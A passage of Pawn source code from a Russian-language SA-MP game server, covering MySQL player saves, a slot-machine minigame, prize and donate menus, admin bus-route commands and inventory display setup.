		,`bQuest0` = '%d',`bQuest1` = '%d',`bQuest2` = '%d',`bQuest3` = '%d',`bQuest4` = '%d'\
		,`bTown` = '%d',`bTimes` = '%d' WHERE `pGrabTeam` = '%d' LIMIT 1",BankGrab[playerid][bLeader],
		BankGrab[playerid][bPlayer][0],BankGrab[playerid][bPlayer][1],BankGrab[playerid][bPlayer][2]
		,BankGrab[playerid][bQuest][0],BankGrab[playerid][bQuest][1],BankGrab[playerid][bQuest][2]
		,BankGrab[playerid][bQuest][3],BankGrab[playerid][bQuest][4],BankGrab[playerid][bTown],BankGrab[playerid][bTimes],PlayerInfo[playerid][pGrabTeam]);
		mysql_tquery(mysql,stringss);
	}
	
	/*
				BankGrab[playerid][bLeader] = BankGrab[player][bLeader];
		 	BankGrab[playerid][bPlayer][0] = BankGrab[player][bPlayer][0];
		 	BankGrab[playerid][bPlayer][1] = BankGrab[player][bPlayer][1];
		 	BankGrab[playerid][bPlayer][2] = BankGrab[player][bPlayer][2];
		 	BankGrab[playerid][bQuest][0] = BankGrab[player][bQuest][0];
		 	BankGrab[playerid][bQuest][1] = BankGrab[player][bQuest][1];
		 	BankGrab[playerid][bQuest][2] = BankGrab[player][bQuest][2];
		 	BankGrab[playerid][bQuest][3] = BankGrab[player][bQuest][3];
		 	BankGrab[playerid][bQuest][4] = BankGrab[player][bQuest][4];
		 	BankGrab[playerid][bTown] = BankGrab[player][bTown];
		 	BankGrab[playerid][bTimes] = BankGrab[player][bTimes];*/
	
	
	
	
	new playername[32];
	GetPlayerName(playerid,playername,32);
	format(src,sizeof(src)," WHERE name='%s'",playername);
	strcat(query,src,sizeof(query));
	mysql_tquery(mysql,query);
	new quests[200];
	for(new i = 1; i < 20; i++)
	{
		if(i == 2) continue;
		switch(i)
	 	{
	 		case 1: format(src,sizeof(src),"%d,%d,%d,",PlayerQuest[playerid][i][0],PlayerQuest[playerid][i][1],PlayerQuest[playerid][i][2],PlayerQuest[playerid][i][3]);
			case 4: format(src,sizeof(src),"%d,%d,%d,%d,%d,",PlayerQuest[playerid][i][0],PlayerQuest[playerid][i][1],PlayerQuest[playerid][i][2],PlayerQuest[playerid][i][3],PlayerQuest[playerid][i][4]);
	        case 3,5,6,7,8,9,10,12,11,14,15..18: format(src,sizeof(src),"%d,",PlayerQuest[playerid][i][0]);
	        case 13: format(src,sizeof(src),"%d,%d,",PlayerQuest[playerid][i][0],PlayerQuest[playerid][i][1]);
	        case 19: format(src,sizeof(src),"%d",PlayerQuest[playerid][i][0]);
		}
		strcat(quests,src);
	}
	
	query = "";
	format(query,sizeof(query),"UPDATE `accounts` SET `pQuests` = '%s' WHERE name = '%s' LIMIT 1",quests,playername);
	mysql_tquery(mysql,query);
	new slots[300],kols[300];
	for(new i = 0; i < 50; i++)
	{
	    format(src,sizeof(src),"%d%s",InvInfo[playerid][iSlot][i],(i == 49) ? ("") : (","));
		strcat(slots,src);
		format(src,sizeof(src),"%d%s",InvInfo[playerid][iKol][i],(i == 49) ? ("") : (","));
		strcat(kols,src);
	}
	query = "";
	format(query,sizeof(query),"UPDATE `accounts` SET `InvSlot` = '%s',`InvKol` = '%s' WHERE name = '%s' LIMIT 1",slots,kols,playername);
	mysql_tquery(mysql,query);
//	printf(query);
	return true;
}
stock GiveMoney(playerid, amount)
{
	PlayerInfo[playerid][pCash]+=amount;
	GivePlayerMoney(playerid, amount);
}
//==============================================================================
stock SetMoney(playerid, amount)
{
	PlayerInfo[playerid][pCash] = amount;
	ResetPlayerMoney(playerid);
	GivePlayerMoney(playerid, amount);
}
//==============================================================================
stock ResetMoney(playerid)
{
	PlayerInfo[playerid][pCash] = 0;
	ResetPlayerMoney(playerid);
}

ProxDetector(Float: radi, playerid, string[], colour)
{
	new Float: ProxX, Float: ProxY, Float: ProxZ;
	GetPlayerPos(playerid, ProxX, ProxY, ProxZ);
 	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
	    if(BigEar[i] > 0) SendClientMessage(i, colour, string);
	    if(GetPlayerVirtualWorld(playerid) == GetPlayerVirtualWorld(i))
	    {
			new Float:r;
			r = GetPlayerDistanceFromPoint(i, ProxX, ProxY, ProxZ);
			if(r < radi)
			{
				SendClientMessage(i, colour, string);
			 	continue;
			}
		}
	}
	return true;
}
stock SetBizInt(username, stolb[], znach)
{
	new Query[128];
	format(Query, sizeof(Query), "UPDATE `biz` SET  %s = '%d' WHERE id = '%d' LIMIT 1", stolb, znach, username);
	return mysql_tquery(mysql,Query);
}
stock SetBizStr(username, stolb[], znach[])
{
	new Query[128];
	format(Query, sizeof(Query), "UPDATE `biz` SET  %s = '%s' WHERE id = '%d' LIMIT 1", stolb, znach, username);
	return mysql_tquery(mysql,Query);
}
stock SetPlayerInt(username[], stolb[], znach)
{
	new Query[128];
	format(Query, sizeof(Query), "UPDATE "TABLE_ACCOUNT" SET  %s = '%d' WHERE name = '%s' LIMIT 1", stolb, znach, username);
	return mysql_tquery(mysql,Query);
}
stock GetAccount(username[], obtaining[])
{
    new Query[128];
    format(Query, 128, "SELECT %s FROM "TABLE_ACCOUNT" WHERE name = '%s' LIMIT 1", obtaining, username);
	mysql_tquery(mysql,Query);
	
	return Query;
/*	new Query[128];
	format(Query, 128, "SELECT %s FROM "TABLE_ACCOUNT" WHERE name = '%s' LIMIT 1", obtaining, username);
	mysql_tquery(mysql,query);
	mysql_store_result();
	if(mysql_fetch_row(Query) == 1)
	{
		mysql_free_result();
		return Query;
	}
	return Query;*/
}
ShowPlayerSlots(playerid,slot1,slot2,slot3)
{
    TextDrawHideForPlayer(playerid,Digit1[0]);
	TextDrawHideForPlayer(playerid,Digit2[0]);
	TextDrawHideForPlayer(playerid,Digit3[0]);

	TextDrawHideForPlayer(playerid,Digit1[1]);
	TextDrawHideForPlayer(playerid,Digit2[1]);
	TextDrawHideForPlayer(playerid,Digit3[1]);

	TextDrawHideForPlayer(playerid,Digit1[2]);
	TextDrawHideForPlayer(playerid,Digit2[2]);
	TextDrawHideForPlayer(playerid,Digit3[2]);

	TextDrawHideForPlayer(playerid,Digit1[3]);
	TextDrawHideForPlayer(playerid,Digit2[3]);
	TextDrawHideForPlayer(playerid,Digit3[3]);

	TextDrawHideForPlayer(playerid,Digit1[4]);
	TextDrawHideForPlayer(playerid,Digit2[4]);
	TextDrawHideForPlayer(playerid,Digit3[4]);

	TextDrawHideForPlayer(playerid,Digit1[5]);
	TextDrawHideForPlayer(playerid,Digit2[5]);
	TextDrawHideForPlayer(playerid,Digit3[5]);


	TextDrawShowForPlayer(playerid,Digit1[slot1]);
	TextDrawShowForPlayer(playerid,Digit2[slot2]);
	TextDrawShowForPlayer(playerid,Digit3[slot3]);

	TextDrawShowForPlayer(playerid,Box);
}
HideSlotsForPlayer(playerid)
{
    TextDrawHideForPlayer(playerid,Digit1[0]);
	TextDrawHideForPlayer(playerid,Digit2[0]);
	TextDrawHideForPlayer(playerid,Digit3[0]);

	TextDrawHideForPlayer(playerid,Digit1[1]);
	TextDrawHideForPlayer(playerid,Digit2[1]);
	TextDrawHideForPlayer(playerid,Digit3[1]);

	TextDrawHideForPlayer(playerid,Digit1[2]);
	TextDrawHideForPlayer(playerid,Digit2[2]);
	TextDrawHideForPlayer(playerid,Digit3[2]);

	TextDrawHideForPlayer(playerid,Digit1[3]);
	TextDrawHideForPlayer(playerid,Digit2[3]);
	TextDrawHideForPlayer(playerid,Digit3[3]);

	TextDrawHideForPlayer(playerid,Digit1[4]);
	TextDrawHideForPlayer(playerid,Digit2[4]);
	TextDrawHideForPlayer(playerid,Digit3[4]);

	TextDrawHideForPlayer(playerid,Digit1[5]);
	TextDrawHideForPlayer(playerid,Digit2[5]);
	TextDrawHideForPlayer(playerid,Digit3[5]);

	TextDrawHideForPlayer(playerid,Box);
}
ExitPlayerFromSlotMachine(playerid)
{
	if(Gambling[playerid] == G_STATE_NOT_GAMBLING) return false;
	HideSlotsForPlayer(playerid);
	DeletePVar(playerid,"Start");
	PlayerTextDrawDestroy(playerid,InfoText[playerid]);
	for(new gSL; gSL < 3; gSL++) TextDrawHideForPlayer(playerid, PressH[gSL]);
	Gambling[playerid] = G_STATE_NOT_GAMBLING;
	TogglePlayerControllable(playerid,1);
    return true;
}
forward Gambler(playerid);
public Gambler(playerid)
{
	if(Gambling[playerid] != G_STATE_GAMBLING)
	{
	    print("error: 15. (Ivan_Budko => Форум)");
	    KillTimer(SlotTimer[playerid]);
	    SlotTimer[playerid] = -1;
	    Gambling[playerid] = G_STATE_NOT_GAMBLING;
	    return false;
	}
	SlotCounter[playerid] -= 1;

	new slot = SlotCounter[playerid];
	if(slot < 10) Slots[playerid][2]+=random(3)+1;
	else if(slot < 20)
	{
	    Slots[playerid][1]+=random(3)+1;
	    Slots[playerid][2]+=random(3)+1;
	}
	else
	{
	    Slots[playerid][0]+=random(3)+1;
	    Slots[playerid][1]+=random(3)+1;
	    Slots[playerid][2]+=random(3)+1;
	}
	if(Slots[playerid][0] >= 6) Slots[playerid][0] = 0;
	if(Slots[playerid][1] >= 6) Slots[playerid][1] = 0;
	if(Slots[playerid][2] >= 6) Slots[playerid][2] = 0;

	ShowPlayerSlots(playerid,Slots[playerid][0],Slots[playerid][1],Slots[playerid][2]);

	if(SlotCounter[playerid] == 0)
	{
	    KillTimer(SlotTimer[playerid]);
	    SlotTimer[playerid] = -1;
		Gambling[playerid] = G_STATE_DISPLAY;
		SetTimerEx("PlayAgainTimer",3000,false,"i",playerid);
	    if(Slots[playerid][0] == Slots[playerid][1] && Slots[playerid][0] == Slots[playerid][2])
	    {
	        new money = Bet[playerid]+150;
	        new str[50];
	        format(str,sizeof(str),"~w~Winner: ~g~%d$~w~!",money);
	        GameTextForPlayer(playerid,str,5000,4);
			GiveMoney(playerid,money);
	        Slots[playerid][0] = random(5);
			Slots[playerid][1] = random(5);
			Slots[playerid][2] = random(5);
	    }
	    else
	    {
	        if(Slots[playerid][0] == Slots[playerid][1] || Slots[playerid][1] == Slots[playerid][2] || Slots[playerid][0] == Slots[playerid][2])
			{
		        new money = Bet[playerid]+50;
		        new str[50];
		        format(str,sizeof(str),"~w~Winner: ~g~%d$~w~!",money);
		        GameTextForPlayer(playerid,str,5000,4);
				GiveMoney(playerid,money);
		        Slots[playerid][0] = random(5);
				Slots[playerid][1] = random(5);
				Slots[playerid][2] = random(5);
			}
	        else GameTextForPlayer(playerid,"Bad luck!",3000,4);
	    }
	    return true;
	}
	return false;
}
forward PlayAgainTimer(playerid);
public PlayAgainTimer(playerid) ExitPlayerFromSlotMachine(playerid);
PutPlayerInSlotMachine(playerid, startBalance)
{
	if(Gambling[playerid] != G_STATE_NOT_GAMBLING) return true;

	Gambling[playerid] = G_STATE_READY;

	Slots[playerid][0] = random(5);
	Slots[playerid][1] = random(5);
	Slots[playerid][2] = random(5);

	ShowPlayerSlots(playerid,Slots[playerid][0],Slots[playerid][1],Slots[playerid][2]);

	Bet[playerid] = startBalance;
	TogglePlayerControllable(playerid,0);
	SlotCounter[playerid] = 30+random(18);
    SlotTimer[playerid] = SetTimerEx("Gambler",100,1,"d",playerid);
    Gambling[playerid] = G_STATE_GAMBLING;
	return true;
}
//================================[ADMIN] ======================
/*CMD:radar(playerid)
{
	new d = RadarInfo[1][rObj];
	new Float:x,Float:y,Float:z;
	GetDynamicObjectPos(d,x,y,z);
	SetCameraPos(playerid,
    AttachCameraToDynamicObject(playerid,RadarInfo[1][rObj]);
    return 1;
}*/
function GetPrizes(playerid)
{
	new rows = cache_get_row_count(mysql);
	if(rows > 0)
	{
	    query = "";
	    new str[70];
		new num,ids,type,prize;
		for(new row = 1; row<= rows; row++)
		{
		    ids = cache_get_field_content_int(row-1, "id", mysql);
		    type = cache_get_field_content_int(row-1, "type", mysql);
		    prize = cache_get_field_content_int(row-1, "prize", mysql);
		    switch(type)
		    {
		        case T_MONEY: format(str,sizeof(str),"%d | Деньги (%d$)\n",num+1,prize);
		        case T_DONATE: format(str,sizeof(str),"%d | Донат (%d Donate Points)\n",num+1,prize);
		        case T_INV: format(str,sizeof(str),"%d | %s (ID: %d)\n",num+1,InvType[prize][invText],InvType[prize][invObj]);
		        case T_VEH: format(str,sizeof(str),"%d | %s (ID: %d)\n",num+1,VehicleNameS[prize-400],prize);
		    }
  			strcat(query,str);
  			ListNick[playerid][num] = ids;
  			num++;
  			if(num >= 15)
			{
			    SetPVarInt(playerid,"CheckPlayer",ids);
			    break;
			}
			if(GetPVarInt(playerid,"CheckPlayer")) strcat(query, "\nДалее >>");
		}
		ShowPlayerDialog(playerid, 489, DIALOG_STYLE_LIST, "Призы", query, "Далее","Отмена" );
	}
	else ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Призы", "{ffffff}У Вас нет призов!", "Далее","Отмена" );
	
	return 1;
}

function GivePrize(playerid,ids)
{
    if(cache_get_row_count(mysql)>0)
	{
	    new type = cache_get_field_content_int(0, "type", mysql);
	    new prize = cache_get_field_content_int(0, "prize", mysql);
	    query = "";
	    
	    switch(type)
	    {
	        case T_MONEY:
			{
				GiveMoney(playerid,prize),SendClientMessage(playerid,CREWARD,"Приз выдан!");
				format(query,sizeof(query),"INSERT INTO `logs` ( `id`, `cho`,`time`) VALUES ('%d', 'Получил приз %d$','%d')",PlayerInfo[playerid][pID],prize,gettime());
				mysql_tquery(mysql,query);
				query = "";
				format(query, sizeof(query), "DELETE FROM prize WHERE id = '%d'", ids);
				mysql_tquery(mysql,query);
			}
	        case T_DONATE:
			{
			    format(query,sizeof(query),"INSERT INTO `logs` ( `id`, `cho`,`time`) VALUES ('%d', 'Получил приз %d Donate Points','%d')",PlayerInfo[playerid][pID],prize,gettime());
				mysql_tquery(mysql,query);
				query = "";
			    format(query, sizeof(query), "DELETE FROM prize WHERE id = '%d'", ids);
				mysql_tquery(mysql,query);
				PlayerInfo[playerid][pDonate] += prize,SendClientMessage(playerid,CREWARD,"Приз выдан!");
			}
	        case T_INV: 
	        {
	            if(GetFree(playerid,prize,1)) return SendClientMessage(playerid,CGREY,"Недостаточно места в инвентаре!");
	            GiveInv(playerid,prize,1);
	            SendClientMessage(playerid,CREWARD,"Приз выдан!");
	            format(query, sizeof(query), "DELETE FROM prize WHERE id = '%d'", ids);
				mysql_tquery(mysql,query);
	        }
	        case T_VEH: 
	        {
	            new str[70];
				format(str,sizeof(str),"Выберите место парковки для транспорта: {f7ae11}/parkprize %d");
				SendClientMessage(playerid,-1,str);
				SendClientMessage(playerid,CREWARD,"Внимание! Данный транспорт появится после перезагрузки сервера (4 утра по МСК)");
				SendClientMessage(playerid,CREWARD,"Также данный транспрот нельзя будет продать государству!");
	        }
	    }
	}
	return 1;
}
function GetCarParize(playerid)
{
    if(cache_get_row_count(mysql)>0)
	{
	    new kek = 0;
	   	for(new i = 1; i<= TOTALV; i++)
		{
		    if(VInfo[i][vcar] == INVALID_VEHICLE_ID) continue;
			if(strcmp(VInfo[i][vname], PlayerInfo[playerid][pSendername], true) == 0) kek++;
		}
	   	if(!PlayerInfo[playerid][pDCar] && kek == 1) return SendClientMessage(playerid,CGREY,"Вы не можете иметь больше 2 машин, не имея привилегии");
	   	if(kek == 2 && PlayerInfo[playerid][pDCar] == 1) return SendClientMessage(playerid,CGREY,"Вы не можете иметь больше 2 машин");
		if(kek >= 3) return SendClientMessage(playerid,CGREY,"Вы не можете иметь больше 3 машин");
		if(GetPlayerVirtualWorld(playerid) || GetPlayerInterior(playerid)) return SendClientMessage(playerid,CGREY,"Парковать транспорт можно только на улице!");
		new prize = cache_get_field_content_int(0, "prize", mysql);
		new Float:x,Float:y,Float:z,Float:fa;
		GetPlayerPos(playerid,x,y,z);
		GetPlayerFacingAngle(playerid,fa);
		query = "";
		format(query,sizeof(query),"INSERT INTO `veh` ( `model`,`name`, `xmag`, `ymag`, `zmag`, `fmag`,`cost`,`x`, `y`, `z`, `fa`) VALUES (%i, '%s','0.0', '0.0', '0.0', '0.0', 0, '%f', '%f', '%f', '%f')",
		prize,PlayerInfo[playerid][pSendername],x,y,z,fa);
		mysql_tquery(mysql,query);
		SendClientMessage(playerid,CREWARD,"Вы успешно припарковали свой будущий транспорт. Он появится после перезагрузки сервера (4 утра по МСК)");
        query = "";
		format(query,sizeof(query),"INSERT INTO `logs` ( `id`, `cho`,`time`) VALUES ('%d', 'Получил приз транспорт (ID: %d)','%d')",PlayerInfo[playerid][pID],prize,gettime());
		mysql_tquery(mysql,query);
		query = "";
		format(query, sizeof(query), "DELETE FROM prize WHERE id = '%d'", cache_get_field_content_int(0, "id", mysql));
		mysql_tquery(mysql,query);
	}
	else SendClientMessage(playerid,CGREY,"Приз не найден!");
	return 1;
}
CMD:parkprize(playerid,params[])
{
	if(GetPVarInt(playerid,"AF") > gettime()) return SendClientMessage(playerid, CGREY, "Не флуди!");
    if(sscanf(params, "d", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /parkprize [id]");
    format(query, sizeof(query), "SELECT * FROM prize WHERE idacc = '%d' AND id = '%d'", PlayerInfo[playerid][pID],params[0]);
	mysql_tquery(mysql, query, "GetCarParize", "d", playerid);
	SetPVarInt(playerid,"AF",gettime()+3);
	return 1;
}


CMD:crimestats(playerid,params[])
{
    if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /crimestats [id]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
 	new Float:x,Float:y,Float:z;
    GetPlayerPos(params[0],x,y,z);
    if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
    query = "";
	format(query,sizeof(query),"{f7ae11}Войны:\n\n\t{ffffff}Количество убийств во время войны:\t{f7ae11}%d{ffffff}\n\t\
	Количество смертей во время войны:\t{f7ae11}%d{ffffff}\n\t{ffffff}\
	Количество нанесенного урона:\t\t{f7ae11}%d{ffffff}\n\t{ffffff}",
	PlayerInfo[playerid][pCrimeStats][C_KILLS],
	PlayerInfo[playerid][pCrimeStats][C_DEATH],
	PlayerInfo[playerid][pCrimeStats][C_AM]);
    format(query,sizeof(query),"%sКоличество объявленных войн:\t\t{f7ae11}%d{ffffff}\n\t{ffffff}\
	Количество выгруженных материалов:\t{f7ae11}%d{ffffff}",query,PlayerInfo[playerid][pCrimeStats][C_CAPTURE],
	PlayerInfo[playerid][pCrimeStats][C_MATS]);
	format(query,sizeof(query),"%s\n\t{ffffff}Количество выгруженных наркотиков:\t{f7ae11}%d{ffffff}\n\t\
	Соотношения убийств и смертей:\t\t{f7ae11}%0.1f{ffffff}\n\n{f7ae11}Угон транспорта:\n\n\t{ffffff}Количество выполненных заказов:\t{f7ae11}%d{ffffff}\n\t\
	Лучшее время выполнения:\t{f7ae11}%s{ffffff}\n\n",query, PlayerInfo[playerid][pCrimeStats][C_DRUGS],
	(PlayerInfo[playerid][pCrimeStats][C_DEATH]) ? (float(PlayerInfo[playerid][pCrimeStats][C_KILLS])/float(PlayerInfo[playerid][pCrimeStats][C_DEATH])) : (0.0),
	PlayerInfo[playerid][pCrimeStats][C_CR],
	PlayerInfo[playerid][pCrimeStats][C_CRT]);
	ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,PlayerInfo[playerid][pSendername],query,"Далее","");
	return 1;
}
CMD:camoff(playerid)
{
    if(GetPVarInt(playerid,"CameraOn"))
	{
		DeletePVar(playerid,"CameraOn");
		for(new gSL; gSL < 2; gSL++) PlayerTextDrawDestroy(playerid, CameraP[gSL][playerid]);
		for(new gSL; gSL < 27; gSL++) TextDrawHideForPlayer(playerid, Camera[gSL]);
		PlayerTextDrawDestroy(playerid,InfoText[playerid]);
		for(new gSL; gSL < 3; gSL++) TextDrawHideForPlayer(playerid, PressH[gSL]);
		TogglePlayerSpectating(playerid,false);
	}
	return 1;
}
CMD:prizes(playerid)
{
	format(query, sizeof(query), "SELECT * FROM prize WHERE idacc = '%d'", PlayerInfo[playerid][pID]);
	mysql_tquery(mysql, query, "GetPrizes", "d", playerid);
	return 1;
}
CMD:donate(playerid)
{
    static const fmt_str[] = "Ваш счет: %i Donate Point";
	new str[sizeof(fmt_str)+10];
	format(str, sizeof(str), fmt_str,PlayerInfo[playerid][pDonate]);
	query = "";
	strcat(query,"1 | Обменять игровую валюту\t{f7ae11}[1 Donate Point - 300$]{FFFFFF}\n2 | Снять варн\t{f7ae11}[35 Donate Point]\n3 | Смена ника\t{f7ae11}[5 Donate Point]{FFFFFF}");
	strcat(query,"\n4 | VIP на 30 дней\t{f7ae11}[250 Donate Point]{FFFFFF}\n5 | Новый слот транспорта\t{f7ae11}[150 Donate Point]{FFFFFF}");
	strcat(query,"\n6 | Открыть кейс\t{f7ae11}[65 Donate Point]{FFFFFF}\n7 | Создать семью\t{f7ae11}[250 Donate Point]{FFFFFF}\
	\n8 | Увеличить место в инвентаре\t{f7ae11}[50 Donate Point]{FFFFFF}\n9 | Наборы\t{f7ae11}[Смотреть]");
	ShowPlayerDialog(playerid,139,DIALOG_STYLE_TABLIST,str,query,"Далее","Назад");
	return 1;
}
CMD:createstop(playerid,params[])
{
    if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 1 || AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "d", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /createstop [id маршрута]");
	if(params[0] < 1) return SendClientMessage(playerid, CGREY, "ID маршрутов от 1");
	SetPVarInt(playerid,"IDMAR",params[0]);
	SendClientMessage(playerid,-1,"Вы создали новый маршрут, используйте /stop для установки точки");
	return 1;
}
CMD:busstop(playerid,params[])
{
    if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 1 || AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "s[32]", params)) return SendClientMessage(playerid, CGREY, "Используйте: /busstop [название]");
	SetPVarString(playerid,"NameBus",params);
	new Float:x,Float:y,Float:z;
	GetPlayerPos(playerid,x,y,z);
//	SetPVarInt(playerid,"ObjStop",CreateObject(1257, x+1, y+1, z+1, 0.0, 0.0, 0.0));
  //  EditObject(playerid, GetPVarInt(playerid,"ObjStop"));
    
    SetPVarInt(playerid,"ObjStop",CreateDynamicObject(1257,x+2,y+2,z,0.0,0.0,0.0));
	EditDynamicObject(playerid,GetPVarInt(playerid,"ObjStop"));
	return 1;
}

CMD:stop(playerid,params[])
{
    if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 1 || AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "d", params[0]) || params[0] < 0 || params[0] > 1) return SendClientMessage(playerid, CGREY, "Используйте: /stop [0 - обычный чекпоинт / 1 - остановка]");
	new Float:x,Float:y,Float:z;
	GetPlayerPos(playerid,x,y,z);
	if(!params[0])
	{
		SendClientMessage(playerid,-1,"Вы создали новую точку. Статус: обычная");
		CreateDynamicPickup(19134,23,x,y,z,0);
	}
	else
	{
	    
		SendClientMessage(playerid,-1,"Вы создали новую точку. Статус: остановка");
		SendClientMessage(playerid,-1,"Для установки остановки используйте: /busstop");
		CreateDynamicPickup(19133,23,x,y,z,0);
	}
	query = "";
	format(query, sizeof(query), "INSERT INTO ways (x,y,z,ways,stop) VALUES ('%f','%f','%f','%d','%d')", x,y,z,GetPVarInt(playerid,"IDMAR"),params[0]);
	mysql_tquery(mysql,query);
	return 1;
}
CMD:inv(playerid)
{

	ActionInventoryP[0][playerid] = CreatePlayerTextDraw(playerid, 563.666381, 193.718460, "LD_SPAC:white"); // box use
	PlayerTextDrawLetterSize(playerid, ActionInventoryP[0][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, ActionInventoryP[0][playerid], 61.000000, 21.570373);
	PlayerTextDrawAlignment(playerid, ActionInventoryP[0][playerid], 1);
	PlayerTextDrawColor(playerid, ActionInventoryP[0][playerid], -37548801);
	PlayerTextDrawUseBox(playerid, ActionInventoryP[0][playerid], true);
	PlayerTextDrawBoxColor(playerid, ActionInventoryP[0][playerid], 255);
	PlayerTextDrawSetShadow(playerid, ActionInventoryP[0][playerid], 0);
	PlayerTextDrawSetOutline(playerid, ActionInventoryP[0][playerid], 0);
	PlayerTextDrawFont(playerid, ActionInventoryP[0][playerid], 4);
	PlayerTextDrawSetSelectable(playerid, ActionInventoryP[0][playerid], true);

	ActionInventoryP[1][playerid] = CreatePlayerTextDraw(playerid, 563.666259, 217.144393, "LD_SPAC:white"); // box drop
	PlayerTextDrawLetterSize(playerid, ActionInventoryP[1][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, ActionInventoryP[1][playerid], 61.000000, 21.570373);
	PlayerTextDrawAlignment(playerid, ActionInventoryP[1][playerid], 2);
	PlayerTextDrawColor(playerid, ActionInventoryP[1][playerid], -37548801);
	PlayerTextDrawUseBox(playerid, ActionInventoryP[1][playerid], true);
	PlayerTextDrawBoxColor(playerid, ActionInventoryP[1][playerid], 255);
	PlayerTextDrawSetShadow(playerid, ActionInventoryP[1][playerid], 0);
	PlayerTextDrawSetOutline(playerid, ActionInventoryP[1][playerid], 0);
	PlayerTextDrawFont(playerid, ActionInventoryP[1][playerid], 4);
	PlayerTextDrawSetSelectable(playerid, ActionInventoryP[1][playerid], true);

	ActionInventoryP[2][playerid] = CreatePlayerTextDraw(playerid, 563.666259, 240.644393, "LD_SPAC:white"); // box info
	PlayerTextDrawLetterSize(playerid, ActionInventoryP[2][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, ActionInventoryP[2][playerid], 61.000000, 21.570373);
	PlayerTextDrawAlignment(playerid, ActionInventoryP[2][playerid], 1);
	PlayerTextDrawColor(playerid, ActionInventoryP[2][playerid], -37548801);
	PlayerTextDrawUseBox(playerid, ActionInventoryP[2][playerid], true);
	PlayerTextDrawBoxColor(playerid, ActionInventoryP[2][playerid], 255);
	PlayerTextDrawSetShadow(playerid, ActionInventoryP[2][playerid], 0);
	PlayerTextDrawSetOutline(playerid, ActionInventoryP[2][playerid], 0);
	PlayerTextDrawFont(playerid, ActionInventoryP[2][playerid], 4);
	PlayerTextDrawSetSelectable(playerid, ActionInventoryP[2][playerid], true);

	ActionInventoryP[3][playerid] = CreatePlayerTextDraw(playerid, 593.333190, 200.025939, "use"); // Text element
	PlayerTextDrawLetterSize(playerid, ActionInventoryP[3][playerid], 0.174333, 1.052444);
	PlayerTextDrawAlignment(playerid, ActionInventoryP[3][playerid], 2);
	PlayerTextDrawColor(playerid, ActionInventoryP[3][playerid], 336860415);
	PlayerTextDrawSetShadow(playerid, ActionInventoryP[3][playerid], 0);
	PlayerTextDrawSetOutline(playerid, ActionInventoryP[3][playerid], 0);
	PlayerTextDrawBackgroundColor(playerid, ActionInventoryP[3][playerid], 255);
	PlayerTextDrawFont(playerid, ActionInventoryP[3][playerid], 2);
	PlayerTextDrawSetProportional(playerid, ActionInventoryP[3][playerid], 1);

	ActionInventoryP[4][playerid] = CreatePlayerTextDraw(playerid, 593.333190, 223.025939, "drop"); // Text element
	PlayerTextDrawLetterSize(playerid, ActionInventoryP[4][playerid], 0.174333, 1.052444);
	PlayerTextDrawAlignment(playerid, ActionInventoryP[4][playerid], 2);
	PlayerTextDrawColor(playerid, ActionInventoryP[4][playerid], 336860415);
	PlayerTextDrawSetShadow(playerid, ActionInventoryP[4][playerid], 0);
	PlayerTextDrawSetOutline(playerid, ActionInventoryP[4][playerid], 0);
	PlayerTextDrawBackgroundColor(playerid, ActionInventoryP[4][playerid], 255);
	PlayerTextDrawFont(playerid, ActionInventoryP[4][playerid], 2);
	PlayerTextDrawSetProportional(playerid, ActionInventoryP[4][playerid], 1);

	ActionInventoryP[5][playerid] = CreatePlayerTextDraw(playerid, 593.333190, 246.525939, "info"); // Text element
	PlayerTextDrawLetterSize(playerid, ActionInventoryP[5][playerid], 0.174333, 1.052444);
	PlayerTextDrawAlignment(playerid, ActionInventoryP[5][playerid], 2);
	PlayerTextDrawColor(playerid, ActionInventoryP[5][playerid], 336860415);
	PlayerTextDrawSetShadow(playerid, ActionInventoryP[5][playerid], 0);
	PlayerTextDrawSetOutline(playerid, ActionInventoryP[5][playerid], 0);
	PlayerTextDrawBackgroundColor(playerid, ActionInventoryP[5][playerid], 255);
	PlayerTextDrawFont(playerid, ActionInventoryP[5][playerid], 2);
	PlayerTextDrawSetProportional(playerid, ActionInventoryP[5][playerid], 1);
	
    CreateInv(playerid);
	
	
//	PlayerTextDrawSetString(playerid,InventoryPlayerP[3][playerid],PlayerInfo[playerid][pSendername]);
	PlayerTextDrawSetPreviewModel(playerid, InventoryP[36][playerid], PlayerInfo[playerid][pModel]);

	new str[5];
	
	format(str,sizeof(str),"%d%",PlayerInfo[playerid][pGolod]);
	PlayerTextDrawSetString(playerid,InventoryP[44][playerid],str);
	format(str,sizeof(str),"%d%",floatround(PlayerInfo[playerid][pHeal]));
	PlayerTextDrawSetString(playerid,InventoryP[45][playerid],str);
	format(str,sizeof(str),"%d%",floatround(PlayerInfo[playerid][pArm]));
	PlayerTextDrawSetString(playerid,InventoryP[46][playerid],str);
	
	PlayerTextDrawTextSize(playerid, InventoryP[43][playerid], PlayerInfo[playerid][pGolod]*0.44, 2.903702);
	
	for(new i = 0; i < 39; i++) TextDrawShowForPlayer(playerid,Inventory[i]);
	new weapons[7],ammo[7];
	for (new i = 0; i < 7; i++) GetPlayerWeaponData(playerid, i, weapons[i], ammo[i]);
				
	
 	for(new i = 0; i < 47; i++)
 	{
 	    if( i >= 0 && i <= 42)
	 	{
	 	    if(i >= 0 && i<= 5)
		    {
		 	    if(ammo[i+1])
				{
					switch(weapons[i+1])
					{
					    case 1:
						{
